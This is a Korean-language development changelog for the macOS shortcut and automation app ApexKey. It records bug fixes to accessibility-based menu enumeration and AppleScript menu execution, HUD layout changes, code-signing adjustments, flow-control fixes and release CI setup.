> **목표**: 리디자인 후속 점검에서 발견된 3건 수정 + 누락된 뷰 테마 보강.
> BUILD SUCCEEDED · 단위 테스트 회귀 없음.

- **A (앱 상세 빈 내용 100% 폭)** — '앱 실행/토글' 카드처럼 '설정된 글로벌 단축키'·'URL Scheme'의 **빈 상태 텍스트에 전체 폭 행 배경**(inputBackground + 라운드 6)을 적용해 가로 100%로 정렬 (`AppDetailView.swift`)
- **B (동작 삭제 컨펌)** — 동작 스테이션 휴지통 버튼에 `confirmationDialog` 추가(단계 수·되돌릴 수 없음 안내, 삭제/취소). 실수 삭제 방지 (`ShortcutStationView.swift`)
- **C (동작 편집 창 가운데 테마 미적용) — 누락 뷰 보강** — 중앙 단계 목록 `StepRowView.swift`(`StepRowView`/`BlockStepRowView`/`StepConnectorView`/`StepListView`)가 미테마여서 하드코딩 시스템 색이 남아 있던 것. theme 토큰으로 전환 + 편집기 중앙 패널에 `.background(theme.primaryBackground)` 추가. 부수로 편집기 '자동화'에서 여는 `AutomationSettingsView.swift`도 미테마라 함께 토큰 교체.

## 2026-09-04 macos — 저장소 공개 준비 (README·랜딩·릴리즈 CI)

> **목표**: GitHub(BoraSarang/ApexKey) 공개 배포 인프라 구축 + 원격 저장소 연결.
> 신규 파일: README.md(한)·README.en.md(영)·LICENSE(MIT), `website/`(GitHub Pages 랜딩), `.github/workflows/`(ci·pages·release).

- **README(한·영)** — 소개/기능 표/설치/사용법/빌드/문서 링크.
- **랜딩 페이지** — `website/index.html`(반응형 다크 단일 페이지, 기능·3단계 시작·다운로드, 최신 릴리즈 자동 연결), `styles.css`, `script.js`.
- **GitHub Actions** — `ci.yml`(push/PR 빌드+테스트), `pages.yml`(website→GitHub Pages 배포), `release.yml`(`v*` 태그 → Release 빌드 + ZIP/DMG + 선택적 노타라이즈 + GitHub Release).
- **라이선스** — MIT (BoraSarang).
- 원격 저장소 `origin` 연결 및 `main` 초기 push. 후속 커밋은 그대로 push 가능.

## 2026-09-03 macos — 빈 창 제거(AppKit @main 전환) + 패널 토글 개선 + 전체화면 HUD 정렬 (A·B·C·D)

> **목표**: (A) SwiftUI `WindowGroup { EmptyView() }`가 만드는 시작 빈 창 근본 제거, (B) '뒤로 숨은' 패널을 메뉴바 클릭 한 번으로 앞으로 가져오기, (C·D) 전체화면 HUD 정렬 개선.
> BUILD SUCCEEDED · `./build_and_run.sh test macos unit` 통과(신규 회귀 포함 36/37, 기존 1건은 환경 의존 실패 무관).

- **A (빈 창 제거) — 순수 AppKit `@main` 전환** — `Sources/ApexKey/ApexKeyApp.swift`(`@main struct ApexKeyApp: App` + `WindowGroup { EmptyView() }`, 빈 창 원본) 삭제하고 `Sources/ApexKey/main.swift` 신규:
  ```swift
  MainActor.assumeIsolated {
      let app = NSApplication.shared
      let delegate = AppDelegate()
      app.delegate = delegate
      app.run()
  }
  ```
  - 이미 AppKit(`NSPanel`/`NSStatusItem`)이 모든 창·메뉴바를 담당하므로 SwiftUI scene 불필요. `@main`과 top-level `main.swift` 공존 충돌 방지를 위해 `ApexKeyApp` 제거.
  - **`closeBootWindow()` 폐기** — WindowGroup이 사라져 시작 시 빈 창 자체가 생성되지 않음 (기존엔 `applicationDidFinishLaunching` 시점에 SwiftUI 창이 아직 없어 닫지 못하는 타이밍 문제로 잔류했음).
  - **`applicationShouldHandleReopen(_:hasVisibleWindows:)` 구현** — 파인더/Dock 재실행(open) 시 새 빈 창을 만들지 않고 메뉴바만 유지(선택 a). `hasVisibleWindows==true`면 기존 패널을 앞으로, 그 외엔 activate만.
- **B (패널 토글 개선) — `togglePanel`이 '뒤로 숨은 패널'을 앞으로 가져오기** — 기존 `if panel.isVisible`은 `hidesOnDeactivate=false`라 다른 앱 뒤로 숨은 패널(`isVisible=true`)도 '닫힘'으로 오판 → 첫 클릭이 반응 없음처럼 보임. `if panel.isVisible && (panel.isKeyWindow || NSApp.keyWindow === panel)`이면 닫고, 그 외엔 `activate + makeKeyAndOrderFront + orderFrontRegardless`로 앞으로 가져오기 (`AppDelegate.swift`)
- **C (전체화면 HUD 단일 메뉴 왼쪽 정렬) — 4열 틀 유지 + 좌측 정렬** — `MenuHUDOverlayView.grid`의 `HStack`이 중앙 정렬이라 메뉴 1개(첫 열·240폭)가 왼쪽 25%가 아니라 중앙(두 번째 칸 위치)에 옴. `ScrollView(.vertical)`로 명시(양방향 무한 폭 제안 회피) + `HStack`에 `.frame(maxWidth:.infinity, alignment:.leading)` 적용 → 4열 틀과 빈 칸은 유지하되 첫 열이 화면 가장 왼쪽에 (메뉴 1개 = 첫 칸 표시) (`MenuHUDOverlayView.swift`)
- **D (전체화면 HUD 단축키 없는 항목 keycap 자리 유지) — 고정 빈칸** — `row`/`selectableRow`가 `if hasKeyEquivalent { keycap }`이라 단축키 없는 항목은 keycap 자체가 사라져 `Text(title)`이 왼쪽 끝으로 밀려 정렬이 깨짐. 공용 `@ViewBuilder func shortcutSlot(_:)`으로 단축키 있으면 `keycap`, 없으면 **`Text("").frame(width:52, height:22)` 고정 빈칸**으로 텍스트 시작 위치(단축키 열) 세로 정렬 유지. ⚠️ 시행착오: `Color.clear.frame(minWidth:52)`는 flex 팽창으로 HStack 레이아웃을 깨뜨려(메뉴 오른쪽 밀림·빈 칸) 부적합, `Text("없음")` 배지는 정렬은 되나 어색 → **고정 크기 빈칸**으로 확정 (`MenuHUDOverlayView.swift`)
- **E (전 앱에서 시스템 '서비스' 메뉴 제거) — Services 서브메뉴 통째 제외** — 계산기 등 모든 앱에 macOS가 주입하는 표준 Services 메뉴(제목 '서비스'/영문 'Services')는 단축키 실행에 무의미하고 목록을 오염시킴. `MenuEnumerator.menuItems(from:)` 자식 재귀에서 title이 `"서비스"`/`"Services"`인 서브메뉴와 그 하위 전체를 건너뜀 (하드코딩 없이 전 앱 일관 제거) (`MenuEnumerator.swift`)
- **F (HUD macOS 표준 레이아웃: 메뉴명 … 단축키 + 서브메뉴 indent) — 단축키를 오른쪽으로** — 기존 HUD가 KeyCue식 '단축키 : 메뉴명'(단축키 왼쪽)이라 맥 표준과 어긋나고 들여쓰기가 어색했음. `row`/`selectableRow`를 **`메뉴명 … 단축키(오른쪽)`** 로 전환(전체화면+플로팅 모두). 서브메뉴 부모는 오른쪽 `▸`, 단축키는 오른쪽 keycap/고정 빈칸. `MenuItem`에 `depth` 필드 추가 + `flattenedWithDepth`(서브메뉴 부모 노드 포함·깊이 보존 평탄화, 최상위 메뉴 노드는 그룹 헤더와 중복이라 생략)로 HUD groups 구성 변경 → 서브메뉴 자식은 메뉴명 왼쪽에서 depth만큼 들여쓰기 (`MenuItem.swift`/`MenuEnumerator.swift`/`AppDelegate.swift`/`MenuHUDOverlayView.swift`/`MenuCheatSheetView.swift`)
- **G (HUD 서브메뉴 부모 클릭 크래시 수정) — SIGTRAP 방지** — `flattenedWithDepth`가 최상위 메뉴 부모 노드(menuPath 단일)를 HUD 행으로 노출시켜 클릭 시 `performAction`의 `path[1..<(path.count-1)]` = `path[1..<0]` 잘못된 범위 접근으로 크래시(EXC_BREAKPOINT/SIGTRAP). ① 최상위 depth 0 노드 생략, ② `performAction` 서브메뉴 체인 루프를 `path.count > 1`로 가드, ③ HUD/플로팅 모든 실행 진입점에서 `!item.isSubmenu` 가드로 서브메뉴 부모 클릭/Enter 실행 차단 (`MenuEnumerator.swift`/`MenuHUDOverlayView.swift`/`MenuCheatSheetView.swift`)
- **검증** — `open`으로 첫 실행·재실행 모두 창 count 0(빈 창 없음) + unified log `[APP] ApexKey 시작`/`No windows open yet` 확인. 핫키 `⇧⌥A`로 `[PANEL] 열기/닫기` 분기 검증. 전체화면 HUD(⇧⌥S, `pref.menuHUDStyle=fullscreen`) 메뉴 1개·5항목 표시·정상 닫힘 확인
- **참고(배경)** — 저장된 `NSWindow Frame SwiftUI.EmptyView-1-AppWindow-1` default 프레임 잔재는 더 이상 사용되지 않음(WindowGroup 제거로)

## 2026-09-03 macos — 흐름·자동화·AI 실행 심층 감사 버그 수정 (B8~B19, P1)

> 깊이 있는 코드 감사(4개 병렬 탐색)로 확인된 **확정 버그** 체계 수정 + 회귀 단위 테스트 19건 추가.
> BUILD SUCCEEDED · `./build_and_run.sh test macos unit` 통과(신규 19건 + 기존 모델 12건 0실패, 기존 1건은 환경 의존 실패 무관).

- **B13 (E-MAC-FLOW) — 반복 인덱스/항목이 특수변수 해석 안 됨** — `Repeat` 루프가 `repeatIndex`/`repeatItem`을 `context.setOutput`(stepOutputs)에만 저장했으나, `SpecialVariable.repeatIndex/repeatItem`은 `ResolveContext.repeatIndex/repeatItem`을 읽어 항상 null. `ExecutionContext`에 `repeatIndex/repeatItem` 상태 추가 + `executeRepeatCountEach`가 설정 + `makeResolveContext`가 전달 (`ExecutionEngine.swift`/`UseModelExecutor.swift`)
- **B14 — `notEquals`가 rightOperand 없을 때 항상 true** — `rightValue == nil || leftValue != rightValue` → 이항 비교로 수정(`rightValue nil/null이면 false`) (`FlowControlModels.swift`)
- **B15 — If 조건의 `ConditionOperand.specialVariable` 항상 null** — 조건 평가를 `[UUID:VariableValue]` 대신 `ResolveContext` 기반으로 전환, specialVariable(`repeatIndex`/`lastResult` 등)·magicVariable(`stepOutputs`) 해석 (`FlowControlModels.swift`/`ExecutionEngine.swift`)
- **B8 — `whileLoop` 0회 조용한 실패** — 매치 없이 `count ?? 0`=0회 실행 → 1회 폴백 + `E-MAC-FLOW-7008` 경고 (`ExecutionEngine.swift`)
- **B9 — Choose from Menu `NSAlert.runModal()` 비메인 스레드 호출** — 메인 스레드 보장(`main.sync`) (`ExecutionEngine.swift`)
- **B16 — `runPauseUntilInput`가 no-op(등록만 하고 복귀)** — 실제로 ⌘⇧↩ 입력까지 블로킹. 로컬 모니터는 메인 런루프에 등록, 호출 스레드는 세마포어 대기 (`ActionExecutor.swift`)
- **B17 — `runWait` 메인 스레드 `Thread.sleep` 블로킹** — 메인 스레드 시 백그라운드로 대기 분기 (`ActionExecutor.swift`)
- **B10 — 충전기 트리거 양쪽(연결/해제) 지정 시 한쪽만 평가** — `switch _ where` 분기가 첫 매치만 실행 → 각 eventType 독립 `if` 평가 (`AutomationManager.swift`)
- **B11 — 폴더 트리거 이벤트가 무조건 `.added`** — FSEvent 플래그(파생)로 `added/renamed/removed/modified` 판정 + 트리거 `eventTypes` 필터 (`AutomationManager.swift`)
- **B19 — 실행 통계가 실패에도 증가** — `executeShortcutStats`/`runAutomation`을 `execute` 성공 시에만 `runCount`/`lastRunAt` 갱신 (`ConfigStore.swift`)
- **B18 — 자동화 재등록** — `updateShortcutAutomations`가 `AutomationManager.unregister+register` 호출 확인(기존 커버), 위험 요소 없음 확인
- **신규 발견 — `VariableResolver.stringValue` 숫자 포맷** — `String(Double)`이 정수를 "2.0"으로 표시 → 정수는 "2"로 출력 (`VariableResolver.swift`)
- **도구 — `build_and_run.sh test macos {smoke|unit|full}` 서브커맨드 추가** (기존 빌드 게이트 문서상의 `test` 커맨드 부재 해소)
- **테스트 — `ApexKeyFlowTests` 19건 추가** — B13(B13 반복 인덱스 저장)/B15(LastResult 특수변수 조건 분기) 통합 회귀 + `Condition`(equals/notEquals/특수/매직/greaterThan/contains/isEmpty) + `VariableResolver`(토큰/마법 치환) + `RepeatRule`(평일/주말/매일) + `VariableValue`(Codable 왕복/타입 변환)
- **미해결 (문서화)** — B12 `RepeatRule.weekly/monthly/custom` 항상 true(요일/날짜 저장 필드 부재 → 모델 확장 필요), B7 일반 액션 `toBinding`이 `outputVariables`/`actionParameters` 탈락(R5 리팩터, 블록 편집 R1과 함께 별도 작업)

## 2026-09-03 macos — 동작을 iPhone 단축어 방식으로 전환 (v0.3, Phase 1~8)

- **변경** — '동작(단축어)'을 단순 순차 단계 나열에서 iPhone Shortcuts 방식으로 업그레이드
  - **도메인 모델(T-101)** — `ActionType` 12카테고리(앱/문서/웹/메시지/스크립트/파일/시스템/효율/개발/AI/흐름제어/기타), `Variable`/`FlowControl`/`AutomationTrigger`/`ShortcutPermissions` 모델, `ShortcutItem.combo/automations/variables`, `PersistedShortcut` JSON 데이터 컬럼(steps/triggers/variables/permissions)
  - **편집 UI(T-102)** — `ActionCatalogView`(액션 카탈로그)+`VariablePanelView`(변수 패널)+`StepRowView`/`BlockStepRow`/`StepListView`(계층 단계)+`ShortcutEditorView` 3열 편집기+`StepSettingsView`(T-107)+`AutomationSettingsView`(T-107)
  - **AI 통합(T-103)** — `AIAvailabilityManager`+`UseModelExecutor`/`WritingToolExecutor`/`ImagePlaygroundExecutor`(FoundationModels `#if canImport`+`#available(macOS 26)` 폴백), 커스텀 Logger 전환, 배터리(IOKit)/Wi-Fi(CoreWLAN) 조회
  - **흐름 제어(T-104)** — `ExecutionEngine`(If/Otherwise, Repeat/Repeat Each, Choose from Menu, Stop Shortcut, Set/Output Variable, Run Shortcut)
  - **자동화(T-105)** — `AutomationManager`(시간/폴더/FSEvents+3s debounce/배터리/충전기), 등록·해제·재등록, `runAutomation` 콜백
  - **변수 해석(T-106)** — `VariableResolver` ({매직변수}/{특수변수:name}, 배터리/Wi-Fi, 변수·단계출력·마지막출력 컨텍스트)
- **검증** — Phase 1~7 빌드 성공 후 Phase 8에서 `./build_and_run.sh build macos` → `** BUILD SUCCEEDED **`, `./build_and_run.sh debug macos` → 설치 완료 `~/Applications/ApexKey.app` (손상 없음)
- **Phase 8 하이라이트(T-108)** —
  - 단축키(combo)→단축어 실행 경로 확인(`handleHotKey`/`repeatLastBinding`) + 실행 시 `lastRunAt`/`runCount` 통계 갱신(`executeShortcutStats`)
  - RunShortcut 완성 — `ExecutionEngine.shortcutProvider`(ConfigStore에서 주입)로 실제 단축어 조회·재귀 실행 (`step.target`=UUID)
  - `syncShortcut`이 automations/variables/permissions 등 전 필드 영속화(기존 name/combo/steps만), 접근 제한 `private`→`internal`로 에디터 확장 메서드(`updateShortcutSteps/_Name/_Description/_Automations/_Variables`)에서 호출 가능하게 변경
  - `executeSetVariable`에 VariableResolver 변수 치환 + 값 타입 추론(숫자/불리언/텍스트)
- **문서** — `docs/TODO.md` v0.3 섹션(T-101~108) 기록, 'iPhone 단축어 방식 재검토' 백로그 항목 구현 완료로 제거

## 2026-09-03 macos — 동작 메뉴 명령 단계: 앱/메뉴 선택 UI (T-036)

- **증상** — 동작(단축어)에서 '메뉴 명령' 단계가 실행되지 않음
- **근본 원인** — `ShortcutStationView.buildStep`의 `.menuCommand`가 `target=""`(앱 미지정)·`menuPath=[]`(경로 미지정)로 단계를 생성. `ActionExecutor.execute`의 `.menuCommand`는 `performAction(item, in: binding.target="")`을 호출해 어느 앱에서도 실행하지 못해 구조적으로 실패. (앱 상세 뷰는 앱+경로가 고정돼 동작했지만 동작 단계는 정보가 비어 있었음)
- **수정** — `ShortcutStationView.swift`
  - 단계 편집에서 메뉴 명령 선택 시 '앱 피커' → 선택 앱의 **메뉴 트리에서 실행 항목 선택** UI 제공 (`menuCommandPicker` + 재귀 `MenuChoiceNode`)
  - `ShortcutStep.target=앱번들ID`, `menuPath=항목경로` 저장 (기존 `title` 텍스트 입력 제거) → `menuCommand` 단계가 정상 실행
- **검증** — 빌드 성공 + 재설치/재시작 완료 (PID 27649). IINA 메뉴 AppleScript로 확인: `재생 > 재생목록 반복 재생` 존재 → 동작으로 구성 가능

## 2026-09-03 macos — 시트 내용 상단 정렬

- '새 동작' 이름 입력 시트와 단계 편집 시트가 수직 중앙 정렬 → `.frame`에 `alignment: .topLeading` 추가로 상단 정렬 수정 (`ShortcutStationView.swift`)

## 2026-09-03 macos — 메뉴 HUD 4열 고정 + 단축키 없는 메뉴 포함 + 모디파이어/폴백 수정 (T-035)

- **증상** — ① 메뉴 HUD가 4열 고정 배치가 아니었다(6개 메뉴에서 3열로 줄어듦). ② 모디파이어가 전부 유실(예: "새 세션"이 "S"로 표시). ③ 점 표기 "…"/한글 제목이 단축키 키캡으로 오인 표시. ④ 단축키 없는 메뉴 항목이 HUD·앱 단축키 설정에서 누락
- **근본 원인** —
  - 그리드: 연속 블록 `ceil(n/4)` 청킹은 n=6에서 3열 생성 → `i % 4` round-robin으로 항상 4열 유지 필요
  - 모디파이어: AX `kAXMenuItemCmdModifiersAttribute`는 **low-4-bit 인코딩**(bit0⇧/bit1⌥/bit2⌃/bit3=⌘없음 역치). 기존 Carbon `cmdMask(1<<8)` 등으로 AND → 모든 모디파이어 유실
  - 폴백: `parseKeyEquivalent`가 문자가 1글자/F키(`^F\d+$`)가 아니어도 키로 취급해 "…"·한글을 키캡으로 표시
  - 필터: `shortcutItems`(단축키 있는 잎만)를 그대로 쓰면서 단축키 없는 명령이 목록에서 사라짐
- **수정** — `MenuEnumerator.swift`, `AppDelegate.swift`, `MenuHUDOverlayView.swift`, `MenuCheatSheetView.swift`, `AppDetailView.swift`, `ConfigStore.swift`
  - `menuColumns`: `i % 4` round-robin → 항상 4열(각 25%), `HStack(alignment:.top)` + 좌/상단 정렬
  - `keyEquivalent(from:title:)`: AX low-4-bit → Carbon flags 변환(commandChar/modifiers 정확화)
  - `parseKeyEquivalent(in:)`: 단일 문자·`^F\d+$`만 유효, 그 외 `("",0)` (단축키 없음)
  - `allItems(in:)` 추가: 서브메뉴 재귀 평탄화, 단축키 유무 무관 잎 평면화 → HUD 그룹 및 AppDetailView 검색에 적용
  - HUD 헤더에 모디파이어 범례(`⌘ ⌃ ⇧ ⌥ 🌐`) + `단축키 없는 메뉴 표시` 토글(`ConfigStore.showNoShortcutItems`, 기본 ON·Persisted)
  - 단축키 없는 항목: 키캡/배지 자리 미표시(제목만). 분리자(`isSeparator`): 텍스트 대신 가로 구분선. 검색 결과에서 분리자 제외
- **검증** — 빌드 성공, 유닛테스트 12건 통과(1건은 MovistPro 미설치 환경 실패·변경 무관), 재설치/재시작 완료 (PID 76271). 4열 최종 렌더는 사용자 확인 대기

## 2026-09-03 macos — 메뉴 실행 AppleScript 전환 (T-034, E-MAC-MENU-3002)

- **증상** — IINA "URL 열기…"/"열기…" 메뉴 단축키(테스트·핫키)가 프로세스 내에서만 실패. 로그: `메뉴 실행 경로: 파일 > URL 열기…` → `경로 단계 미발견: URL 열기… (단계 2/2)` → `E-MAC-MENU-3002`
- **근본 원인** — AX 직접 press(`child(named:)` 경로 해석 + `kAXShowMenuAction`/`kAXPressAction`)가 대상 앱 **활성화 직후 닫힌 트리에서 일시적으로 nil**을 반환하는 transient 실패. 독립 재현 스크립트(메인/백그라운드 스레드·activation 포함)로는 FOUND여서 앱 프로세스 한정으로 확인. 접근 로직/스레드/권한/샌드박스(미샌드박스) 이상 없음
- **수정** — `MenuEnumerator.performAction`을 AX 직접 press에서 **System Events AppleScript 메뉴 클릭**으로 교체
  - 경로 예 `["파일","URL 열기…"]` → `tell process "IINA" to click menu item "URL 열기…" of menu 1 of menu bar item "파일" of menu bar 1`
  - 3단계 이상 서브메뉴는 `of menu 1 of menu item "<중간>" of …` 체인으로 구성
  - AppleScript 계층은 빈 AXMenu 레벨을 자동 처리 → 구조 차이·transient nil이 구조적으로 소멸
  - 죽은 코드 정리: AX 경로 해석 `child(named:)`, `MenuActionResult.pressFailed(AXError)` 제거
- **검증** — 라이브 IINA에서 `exists menu item "URL 열기…" of menu 1 of menu bar item "파일" of menu bar 1` = true. 실제 핫키(⌥⌃L) 및 테스트에서 URL 열기 대화상자 6회 연속 성공. 빌드 + 유닛테스트 통과(환경 의존 `testRegisteredAppURLResolvedByBundleID`는 MovistPro 미설치로 실패, 변경 무관). 재설치/재시작 완료

## 2026-09-03 macos — 앱 간 빈 AXMenu 구조 차이로 인한 메뉴 실행 실패 해결 (T-033, E-MAC-MENU-3002)

- **증상** — T-032 이후 AIModelTalk/IINA는 실행되지만, MovistPro "파일 열기…"는 실행 실패. 실제 로그:
  `메뉴 실행 경로: 파일 >  > 파일 열기…` → `경로 단계 미발견: "" (단계 2/3)` → `E-MAC-MENU-3002 메뉴 항목을 찾지 못함`
- **근본 원인** — 빈 `AXMenu(title="")` 컨테이너 레벨의 유무가 **앱마다 다름**.
  - AIModelTalk/IINA: `AXMenuBarItem("파일") > AXMenu("") > AXMenuItem` (빈 레벨 존재)
  - MovistPro: `AXMenuBarItem("파일") > AXMenuItem` (빈 레벨 없음, 항목이 직계)
  T-032에서 빈 단계를 "무조건 보존"했더니, 빈 레벨이 없는 앱에서는 경로의 `""` 단계를 못 찾아 실패.
- **수정** — `MenuEnumerator.swift`
  - `makeMenuItem`: 빈 title 컨테이너를 `menuPath`에 넣지 않고 **자식 경로로 흡수** (`effectivePath`) → menuPath가 앱 무관하게 일관된 `["파일", "항목"]` 형태로 저장
  - `child(named:of:)`: **빈 title + submenu인 AXMenu 컨테이너를 재귀로 파고들어** 원하는 항목을 찾도록 개선 → 빈 레벨 있든/없든 동일 경로로 동작
- **검증** — 메모리 트리 시뮬레이션(빈 레벨 유/무 2구조 × 신규 child 로직) 전부 FOUND. 빌드 + 유닛테스트 통과(환경 의존 `testRegisteredAppURLResolvedByBundleID`는 MovistPro 미설치라 실패, 변경 무관). debug 빌드/설치/재시작 완료

## 2026-09-03 macos — IINA 등 메뉴 트리에 "(하위 메뉴)" 노드로 숨던 문제 해결 (T-033 후속, 메뉴 트리)

- **증상** — IINA 앱 상세에서 메뉴 트리가 안 나옴(실제 항목이 안 보임). 각 최상위 메뉴가 빈 `AXMenu("")` 컨테이너 하나를 유일한 자식으로 가져, 항목들이 한 단계 더 깊이 "(하위 메뉴)" 노드 안에 접힌 채로 숨음
- **근본 원인** — 메뉴 트리(`MenuTreeView`)가 `MenuItem.title`/`children`으로 그리는데, 열거 시 **빈 title인 `AXMenu("")` 컨테이너가 그대로 MenuItem 노드**로 만들어져 실제 항목들을 감쌌다
- **수정** — `MenuEnumerator` 열거를 `menuItems(from:parentPath:)`로 리팩터. 빈 title + submenu(AXMenu 컨테이너)는 **노드로 만들지 않고 자식만 상위로 끌어올림(flatten)** → 실질 항목들이 최상위 메뉴 직하에 나타남. menuPath도 `["파일", "열기…"]`로 깨끗하게 유지
- **검증** — 라이브 IINA AX로 확인: 파일 14개/재생 35개/비디오 28개 등 직접 항목 표시. `child(named:)` 실행 탐색도 "파일 > 닫기" FOUND (T-033 동작 보존). 빌드 + 유닛테스트 통과, 재설치/재시작 완료

## 2026-09-03 macos — 메뉴 단축키 테스트/실행 실패 해결 (T-032, E-MAC-MENU-*)

- **증상** — 메뉴 단축키 추가 시 테스트 버튼이 항상 실패 (저장 안 한 상태에서도)
- **근본 원인** — `MenuEnumerator.performAction`이 `menuPath.filter { !$0.isEmpty }`로 **빈 문자열(AXMenu 컨테이너, title="") 단계를 제거** → 실제 AX 계층(메뉴바 > 파일 > AXMenu("") > 항목)은 3단계인데 경로가 2단계(`["파일","새 대화"]`)로 축소되어 `.menuNotFound` 실패. 실제 `menuPath=["파일","","새 대화"]`로 AX 재현 스크립트로 확정
- **수정** — `MenuEnumerator.performAction`에서 `filter { !$0.isEmpty }` 제거. 빈 컨테이너 단계를 보존해 `child(named:"")`이 AXMenu와 1:1 일치 → 정상 탐색/실행
- **검증** — AX 재현 스크립트로 menuPath 확정, 빌드 + 유닛테스트 13건 통과, 재설치/재시작

## 2026-09-03 macos — 메뉴 목록 트리 표시 (T-031)

- 앱 상세 "메뉴 단축키" 섹션을 **전체 메뉴 트리로 표시**하도록 변경
- 검색어 없음 → `MenuTreeView`가 최상위 메뉴바 그룹을 기본 펼침으로, 하위 서브메뉴는 개별 펼침/접기(DisclosureGroup)로 계층 표시
- 검색어 입력 → 단축키 항목 평면 검색 결과로 전환 (기존 동작 유지)
- 재귀 `MenuTreeNode` 뷰 도입 (각 노드 고유 펼침 상태). 유닛테스트 13건 통과

## 2026-09-03 macos — 메뉴 단축키 검색 불가 해결 (T-030, E-MAC-MENU-*)

- **증상** — AI 모델 Talk, IINA 등에서 "메뉴 단축키를 찾을 수 없습니다" 표시 (접근성 권한·타깃 앱 실행 정상인데도 빈 목록)
- **근본 원인** — AX 메뉴 구조가 `AXMenuBarItem > AXMenu(title="") > AXMenuItem` 3단계인 앱에서, 제목 없는 `AXMenu` 컨테이너가 `MenuEnumerator.makeMenuItem`의 separator 판정(`title.isEmpty && combo.char.isEmpty`)에 걸려 **분리자로 버려지고, 그 자식(단축키 항목)이 전부 유실**
- **수정** — `MenuEnumerator.swift` separator 판정에 `&& children.isEmpty` 조건 추가. 제목이 비어 있어도 자식(submenu)이 있는 `AXMenu`는 separator가 아니라 submenu로 유지
- **검증** — 임시 AX 재현 스크립트로 AIModelTalk 30개 / IINA 81개 단축키 항목 추출 확인. 유닛테스트 13건 통과, debug 빌드/설치/재시작 완료

## 2026-09-03 macos — 접근성 권한 리빌드 유지 (T-029)

- **근본 원인** — `build_and_run.sh`의 ad-hoc 서명(`CODE_SIGN_IDENTITY=-`)은 리빌드마다 **다른 코드 identity**를 만들어 macOS TCC가 접근성 권한을 유지하지 못함 → "설정에서 삭제 후 재등록해야만 동작" 증상
- **수정** — 무료 Apple 개발자 인증서의 `DEVELOPMENT_TEAM=6GPJQ7BQC9` 고정 자동 서명으로 전환
  - `project.yml`: 앱/테스트 타깃 모두 `DEVELOPMENT_TEAM` 추가 (테스트 타깃 `CODE_SIGN_IDENTITY=-` 제거)
  - `build_and_run.sh`: `CODE_SIGN_IDENTITY=- CODE_SIGNING_REQUIRED=NO` → 자동 서명으로 대체
- **검증** — `TeamIdentifier=6GPJQ7BQC9` 고정, 리빌드 2회 연속 동일 `CDHash` 확인 → 접근성 권한이 리빌드 후에도 유지. 유닛테스트 13건 통과, debug 빌드/설치 완료
- **사용자 조치** — 손쉬운 사용에서 ApexKey를 **1회만** 재허용하면 이후 리빌드에도 유지됨

## 2026-09-03 macos — 메뉴 명령 실행 경로화 (T-028)

- **메뉴 명령 미동작 근본 수정** — 열지 않은 채 하위 항목을 직접 `AXPress`하면 실패하던 구조를 경로 기반 실행으로 변경
  - `MenuItem.menuPath`: 최상위 메뉴부터 항목까지의 경로 체인을 열거 시 누적 저장
  - `HotKeyBinding.menuPath` + `PersistedBinding.menuPathRaw`: 메뉴 경로 영속 (자동 경량 마이그레이션, `ZMENUPATHRAW`)
  - `MenuEnumerator.performAction`: 저장된 경로를 따라 최상위 메뉴를 `kAXShowMenuAction`으로 순차 펼친 뒤 최종 항목 `kAXPressAction` — 경로 없음/권한/미발견/press 실패를 `MenuActionResult` enum으로 구분해 실패 원인 식별
  - `ActionExecutor.execute`가 `Bool` 반환 (메뉴 명령 성공 판별/테스트 안내에 사용)
  - 기존 경로 없는 메뉴 바인딩은 title 단일 경로로 fallback
- 단위 테스트 13건 통과 (신규: `menuPath` 영속 왕복, 경로 fallback), debug 빌드/설치 완료 (`~/Applications/ApexKey.app`)

## 2026-09-02 macos — 실행/토글이 미실행 앱도 실행 (T-027)

- **`AppSwitcher.activate` 개선** — 실행/토글 단축키가 꺼져 있는 앱을 못 여는 문제 수정
  - 기존: 바인딩에 경로 미저장(`target`=bundleID)이라 `path`가 nil → 미실행 앱 실행 불가 → 테스트/단축키 모두 `false`
  - 수정: 경로가 없으면 `NSWorkspace.urlForApplication(withBundleIdentifier:)`로 LaunchServices에서 앱 URL 해석 후 `open`
  - 스모크 테스트 추가: `com.apple.Safari`/`com.movist.MovistPro` 등록 앱 URL 해석 확인
- 단위 테스트 11건 통과, debug 빌드/설치 완료 (`~/Applications/ApexKey.app`)

## 2026-09-02 macos — "단축키가 안 먹는" 근본 원인 + 테스트 실동작 (T-024, T-025, T-026)

- **SwiftData 전용 저장소 경로** (`ConfigStore`) — 원인: 기본 경로 `~/Library/Application Support/default.store`가 다른 SwiftData 앱(채팅 앱)과 공유되어 스키마 충돌 → `ModelContainer` 생성 실패 → `addBinding`이 핫키 등록 전에 조기 반환되어 "저장 후 단축키 미동작"이 발생
  - 저장소 URL을 `~/Library/Application Support/com.borasarang.ApexKey/default.store`로 격리 (디렉토리 생성 포함)
  - 회귀 테스트 `ApexKeyStoreTests` 2건 추가 (전용 URL 컨테이너 생성·영속, 서로 다른 컨테이너 무충돌)
- **테스트 버튼 실제 액션 실행** (`HotKeyRecorderView` + 호출부 6곳)
  - `onTest` 프리뷰 추가: 테스트 키 감지 시 실제 액션(메뉴 명령/앱 실행·토글/시스템/스크립트/새액션/패널 토글) 수행
  - 실행 실패 시 "단축키는 감지됐지만 실행에 실패" 안내 (`testFailed`)
- **메뉴 명령 동작 방식 개선** (`AppDetailView`/`ActionExecutor`/`MenuEnumerator`)
  - 메뉴 명령 `onlyWhenAppActive=false` — 전면 여부와 무관하게 실행
  - 실행 시 대상 앱을 `AppSwitcher.activate`로 전면화 후 비동기 AX press
  - `findAXElement`를 leaf(`AXMenuItemRole`·하위 없음) 우선 매칭으로 개선 — 상단 메뉴 이름과 충돌 방지
- 참고: 기존 데이터는 점유된 default.store에 있어 소실 — 단축키 재설정 필요
- 단위 테스트 10건 통과, debug 빌드/설치 완료 (`~/Applications/ApexKey.app`)

## 2026-09-02 macos — 단축키 저장 검증 (T-022, T-023)

- **핫키 저장 플로우 개선** (`HotKeyRecorderView`)
  - "저장" 시 중복/사용 가능 여부를 먼저 검사
  - 사용 가능 → "적용되었습니다" 안내 후 3초 뒤 자동 닫힘
  - 중복/사용 불가 → 사유 안내 후 재입력 가능 (즉시 닫히지 않음)
  - 신규 "테스트" 버튼: 실제 등록 후 눌림을 확인해 성공/실패 표시
- **등록 가능성 검증 추가** (`HotKeyService`)
  - `isComboAvailable(_:)`: 임시 등록(RegisterEventHotKey) 후 즉시 해제로 시스템 점유 여부 판별
  - `beginTest`/`endTest`: 테스트용 임시 등록
- **교체 대상 조합 제외** (`HotKeyCombo.matches(_:)` + 호출부 배포)
  - 패널 토글 / 시스템 동작 / 앱 실행·토글 / 스크립트 단축키 재지정 시 같은 조합 허용
